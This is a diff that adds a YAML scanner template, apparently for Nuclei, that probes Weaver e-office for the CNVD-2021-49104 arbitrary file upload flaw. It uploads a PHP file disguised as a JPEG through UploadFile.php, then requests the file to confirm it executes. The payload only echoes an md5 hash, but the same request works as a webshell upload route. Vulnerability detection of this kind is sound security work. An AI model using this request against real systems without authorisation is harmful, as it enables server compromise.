@@ -1,0 +1,45 @@
+id: poc-yaml-weaver-eoffice-arbitrary-cnvd-2021-49104-file-upload
+
+info:
+  name: poc-yaml-weaver-eoffice-arbitrary-cnvd-2021-49104-file-upload
+  author: Aurora
+  severity: critical
+  tags: xray-converted,fileupload,cnvd-2021-49104,ct-456747
+  reference:
+    - https://chowdera.com/2021/12/202112190747169542.html
+
+http:
+  - raw:
+      - |
+        POST /general/index/UploadFile.php?m=uploadPicture&uploadType=theme&userId= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{rand_base(8)}}
+
+        --{{rand_base(8)}}
+        Content-Disposition: form-data; name="Filedata"; filename="test.php"
+        Content-Type: image/jpeg
+        
+        <?php
+        echo md5({{rand_int(1000, 9999)}});
+        ?>
+        --{{rand_base(8)}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "name"
+  - raw:
+      - |
+        GET /images/themes/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
